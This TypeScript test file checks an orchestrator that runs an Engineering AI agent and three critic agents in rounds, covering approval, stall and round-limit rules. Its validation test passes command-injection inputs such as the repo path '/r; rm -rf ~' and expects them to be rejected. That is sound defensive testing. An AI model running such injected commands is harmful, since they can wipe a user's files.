    const withPlan = (p: any) => (label: string, prompt?: string, opts?: any) => (label === "planning" ? p : loop({})(label, prompt, opts));
    await expect(run("engineer-loop", start(), withPlan({ ...plan, base_sha: "HEAD" }))).rejects.toThrow(/no usable base_sha/);
    await expect(run("engineer-loop", start(), withPlan({ ...plan, criteria: [] }))).rejects.toThrow(/at least one acceptance criterion/);
    await expect(run("engineer-loop", start(), withPlan({ ...plan, criteria: [plan.criteria[0], plan.criteria[0]] }))).rejects.toThrow(/its own id/);
    await expect(run("engineer-loop", start(), withPlan({ ...plan, criteria: [{ id: "", statement: "s", how_to_check: "h" }] }))).rejects.toThrow(/its own id/);
  });

  it("takes only a run id, a repository path and a list of checks that cannot break out of the commands the agents are given", async () => {
    for (const run_id of ["a.b", "x.lock", "...", "-ab", ".ab", "a/b", "ab c", "a;b", "x".repeat(41)]) await expect(run("engineer-loop", { task: "x", run_id }, loop({}))).rejects.toThrow(/args\.run_id/);
    for (const repo of ["relative/path", "/r; rm -rf ~", "/r && echo hi", "/r\nx", "/a b", 5]) await expect(run("engineer-loop", start({ repo }), loop({}))).rejects.toThrow(/args\.repo/);
    for (const verify of ["npm test", [5], [""], ["a\nb"], ["x".repeat(201)], Array.from({ length: 13 }, () => "npm test")]) await expect(run("engineer-loop", start({ verify }), loop({}))).rejects.toThrow(/args\.verify/);
    expect((await run("engineer-loop", start({ repo: "/home/user/repo-1.2_x", verify: ["make check"] }), loop({}))).result.approved).toBe(true);
  });

  it("does not overwrite the local branch of an earlier run: the first Engineering agent is told, the later ones are not", async () => {
    const { calls } = await run("engineer-loop", start({ max_iterations: 2 }), loop({ 1: { test: tests(false, ["x"]) } }));
    expect(calls.find((c) => c.label === "engineer:1")!.prompt).toMatch(/already exists .* belongs to an earlier run/);
    expect(calls.find((c) => c.label === "engineer:2")!.prompt).not.toMatch(/belongs to an earlier run/);
  });

  it("is not STALLED by two different findings that carry no key, nor by two different silent critics, nor two different gaps; it is when the same titled finding returns", async () => {
    const f = (title: string) => ({ severity: "major", title, evidence: "e", fix: "f" }); // no key at all
    const different = await run("engineer-loop", start({ max_iterations: 3 }), loop({ 1: { sec: sec([f("SQL injection in a.js")]) }, 2: { sec: sec([f("hard-coded secret in b.js")]) }, 3: { sec: sec([f("SQL injection in a.js")]) } }));
    expect(different.result.status).toBe("NOT_APPROVED_MAX_ROUNDS");
    expect(different.result.rounds_run).toBe(3);
    const gaps = await run("engineer-loop", start({ max_iterations: 3 }), loop({ 1: { test: null }, 2: { val: null }, 3: { sec: null } }));
    expect(gaps.result.status).toBe("NOT_APPROVED_MAX_ROUNDS");
    const same2 = await run("engineer-loop", start({ max_iterations: 4 }), loop({ 1: { sec: sec([f("SQL injection in a.js")]) }, 2: { sec: sec([f("SQL injection in a.js")]) } }));
    expect(same2.result.status).toBe("STALLED_SAME_FINDINGS_TWICE");
  });

  it("does not approve on minor findings alone, but does not need them fixed either", async () => {
    const { result } = await run("engineer-loop", start(), loop({ 1: { sec: sec([finding("nit", "minor")]) } }));
    expect(result.status).toBe("APPROVED_FOR_HUMAN_REVIEW");
  });

  it("recycles with the findings when a test fails, a criterion is unmet or a critic reports a major finding, and approves when the next round is clean", async () => {
    const { result, calls } = await run("engineer-loop", start(), loop({ 1: { test: tests(false, ["npm test: 2 failed"]), val: val(["yes", "no"]), sec: sec([finding("secret-in-docs", "blocker")]) } }));
    expect(result.status).toBe("APPROVED_FOR_HUMAN_REVIEW");
    expect(result.rounds_run).toBe(2);
    const second = calls.find((c) => c.label === "engineer:2")!.prompt;
    expect(second).toContain("secret-in-docs");
    expect(second).toContain("npm test: 2 failed");
    expect(second).toContain('"criterion":"C2"');
    expect(second).toContain("c1".padEnd(40, "0")); // it starts from the previous round's commit
    expect(calls.find((c) => c.label === "engineer:1")!.prompt).toContain("This is the first round");
  });

  it("tells the next Engineering round when a critic gave no answer: a gap is feedback too, and it names the critic", async () => {
    const { result, calls } = await run("engineer-loop", start(), loop({ 1: { sec: null } }));
    expect(result.status).toBe("APPROVED_FOR_HUMAN_REVIEW"); // round 2 is clean
    expect(result.rounds_run).toBe(2);
    const second = calls.find((c) => c.label === "engineer:2")!.prompt;
    expect(second).toContain('"from":"orchestrator"');
    expect(second).toContain("the Security agent gave no answer");
  });

  it("never lets the Engineering agent's own account decide: the critics are told not to trust it and are given the commit, not the summary", async () => {
    const { calls } = await run("engineer-loop", start(), loop({}));
    for (const c of calls.filter((x) => /^(test|security|validate):/.test(x.label))) {
      expect(c.prompt).toMatch(/did NOT write this change/);
      expect(c.prompt).toMatch(/must not trust the Engineering agent's account of it/);
      expect(c.prompt).toContain("c1".padEnd(40, "0"));
      expect(c.prompt).not.toContain("round 1"); // the engineer's summary
    }
  });

  it("stops after max_iterations rounds with NOT_APPROVED, and the limit is at most 7", async () => {
    const never = { 1: { test: tests(false, ["a"]) }, 2: { test: tests(false, ["b"]) }, 3: { test: tests(false, ["c"]) } };
    const out = await run("engineer-loop", start({ max_iterations: 3 }), loop(never));
    expect(out.result.status).toBe("NOT_APPROVED_MAX_ROUNDS");
    expect(out.result.approved).toBe(false);
    expect(out.result.rounds_run).toBe(3);
    const many: Record<number, any> = {};
    for (let i = 1; i <= 9; i++) many[i] = { test: tests(false, ["f" + i]) };
    const capped = await run("engineer-loop", start({ max_iterations: 99 }), loop(many));
    expect(capped.result.rounds_run).toBe(7);
    expect(capped.result.max_rounds).toBe(7);
    expect((await run("engineer-loop", start({ max_iterations: 0 }), loop(many))).result.rounds_run).toBe(1);
  });

  it("stops as STALLED when a round finds exactly what the round before it found: no better proven alternative is being reached", async () => {
    const same = { 1: { sec: sec([finding("x")]) }, 2: { sec: sec([finding("x")]) }, 3: { sec: sec([finding("y")]) } };
    const { result } = await run("engineer-loop", start({ max_iterations: 5 }), loop(same));
    expect(result.status).toBe("STALLED_SAME_FINDINGS_TWICE");
    expect(result.rounds_run).toBe(2);
  });

  it("does not approve when a critic gave no answer: a missing review is not a clean one", async () => {
    for (const missing of [{ test: null }, { sec: null }, { val: null }]) {
      const { result } = await run("engineer-loop", start({ max_iterations: 1 }), loop({ 1: missing }));
      expect({ missing, approved: result.approved }).toEqual({ missing, approved: false });
      expect(result.rounds_run).toBe(1);
    }
  });

  it("stops without a result when the Engineering agent gives nothing, and says so", async () => {
    const h = loop({});
    const { result } = await run("engineer-loop", start(), (label, p, o) => (label === "engineer:1" ? null : h(label, p, o)));
    expect(result.status).toBe("STOPPED_NO_ENGINEERING_RESULT");
    expect(result.approved).toBe(false);
  });

  it("does not run the critics of a round before the Engineering agent of that round has finished, and runs the three critics together", async () => {
    const order: string[] = [];
    const h = loop({});
    await run("engineer-loop", start(), (label, p, o) => { order.push(label); return h(label, p, o); });
    expect(order.indexOf("engineer:1")).toBeLessThan(order.indexOf("test:1"));
    expect(order.slice(order.indexOf("engineer:1") + 1)).toEqual(["test:1", "security:1", "validate:1"]);
  });

  it("can skip Research, and puts the sprint's scope into the rules when one is given", async () => {
    const { calls } = await run("engineer-loop", start({ research: false, sprint: 1 }), loop({}));
    expect(calls.map((c) => c.label)).not.toContain("research");
    expect(calls[0].prompt).toContain("Sprint 1, Critical fixes");
    expect((await run("engineer-loop", start(), loop({}))).calls[0].prompt).not.toContain("Scope of this run");
    for (const sprint of [-1, 6, 50, 1.5, "1"]) expect((await run("engineer-loop", start({ sprint }), loop({}))).calls[0].prompt).not.toContain("Scope of this run");
    for (const sprint of [0, 5]) expect((await run("engineer-loop", start({ sprint }), loop({}))).calls[0].prompt).toContain("Scope of this run: Sprint " + sprint);
  });

  it("tells every agent the rules: evidence over assumption, no push, no deployment, no new major dependency, no secrets", async () => {
    const { calls } = await run("engineer-loop", start(), loop({}));
    for (const c of calls) {
      expect(c.prompt).toMatch(/NOT VERIFIED/);
      expect(c.prompt).toMatch(/never push/);
      expect(c.prompt).toMatch(/never print or write a secret value/);
      expect(c.prompt).toMatch(/new major dependency/);
    }
  });

  it("gives the Testing agent the commands to run, and the default ones include the drivers", async () => {
    const { calls } = await run("engineer-loop", start(), loop({}));
    const defaults = calls.find((c) => c.label === "test:1")!.prompt;
    for (const command of ["npm run type-check", "npm run lint", "npm test", "npm run build", "node scripts/drive-all.js"]) expect(defaults).toContain(JSON.stringify(command)); // as an item of the list, not in a sentence about it
    const custom = await run("engineer-loop", start({ verify: ["make check"] }), loop({}));
    const prompt = custom.calls.find((c) => c.label === "test:1")!.prompt;
    expect(prompt).toContain("make check");
    expect(prompt).not.toContain('"npm test"');
  });
});
